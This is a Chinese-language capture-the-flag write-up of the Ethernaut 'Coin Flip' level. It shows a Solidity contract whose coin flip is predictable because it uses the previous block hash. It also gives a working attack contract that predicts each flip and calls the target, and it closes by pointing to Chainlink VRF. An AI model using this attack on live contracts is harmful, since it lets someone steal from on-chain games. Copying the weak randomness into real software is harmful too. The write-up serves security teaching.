# Coin Flip

> 这是一个掷硬币的游戏，你需要连续的猜对结果。完成这一关，你需要通过你的超能力来连续猜对十次。

## 源码

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

## 攻击思路

该合约中所使用的随机数算法依靠块高，而且FACTOR也为public变量。这种随机数方法就变成了伪随机。

## 攻击合约

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";


interface CoinFlip {
    function consecutiveWins() external view returns(uint256);
    function flip(bool _guess) external returns (bool);
}

contract Attack {
    using SafeMath for uint256;

	// 根据我的实例合约地址，生成合约实例
    CoinFlip constant private target = CoinFlip(0xed1c7473A164Ff3C40Ff344d0cb4C222f2fdCC7C);

    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number.sub(1)));
        uint256 coinFlip = blockValue.div(FACTOR);
        bool side = coinFlip == 1 ? true : false;
        target.flip(side);
    }
	// 此函数方便我查看被攻击合约中的成功次数
    function getConsecutiveWins() public view returns (uint256){
        return target.consecutiveWins();
    }
}
```

手动调用十次attack函数，可以产生的错误：out of gas、revert等

## 建议的随机数算法

想要获得密码学上的随机数,你可以使用 [Chainlink VRF](https://docs.chain.link/docs/get-a-random-number), 它使用预言机, LINK token, 和一个链上合约来检验这是不是真的是一个随机数.